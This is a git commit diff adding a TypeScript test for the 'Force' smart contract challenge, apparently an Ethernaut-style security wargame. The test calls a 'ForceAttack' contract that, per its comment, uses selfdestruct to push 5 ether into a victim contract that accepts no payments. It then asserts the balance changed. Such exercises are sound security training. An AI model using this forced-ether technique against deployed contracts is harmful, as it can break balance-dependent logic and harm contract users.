6f0c1579f55b69c3accf4896c6a905afa7776f1a
Sergi Juanati <wint3rmute@gmail.com>
2021-03-15 06:41:51 +0100

    Added solution for Force

--- test/7-force.ts
+++ test/7-force.ts
@@ -1,5 +1,6 @@
 import { accounts, contract, web3 } from '@openzeppelin/test-environment';
 const { balance, ether } = require('@openzeppelin/test-helpers');
+import assert = require('assert');
 
 // Addresses
 const [
@@ -9,20 +10,25 @@ const [
 
 // Loads contracts
 const Force = contract.fromArtifact('Force');
+const ForceAttack = contract.fromArtifact('ForceAttack');
 let force: any;
+let forceAttack: any;
 
 beforeEach(async () => {
     force = await Force.new(owner, { from: owner });
+    forceAttack = await ForceAttack.new(owner, { from: attacker });
 });
 
 it('Force -> make the balance of the contract greater than zero', async () => {
 
     const balanceBefore = await balance.current(force.address);
-    console.log('before', balanceBefore.toString());
 
-
+    // Call a selfdestruct contract to transfer ether to the victim
+    await forceAttack.attack(force.address, { value: ether('5'), from: attacker });
 
     const balanceAfter = await balance.current(force.address);
-    console.log('after', balanceAfter.toString());
+
+    assert(balanceBefore.toString() === '0');
+    assert(balanceAfter.toString() === ether('5').toString());
 });
 
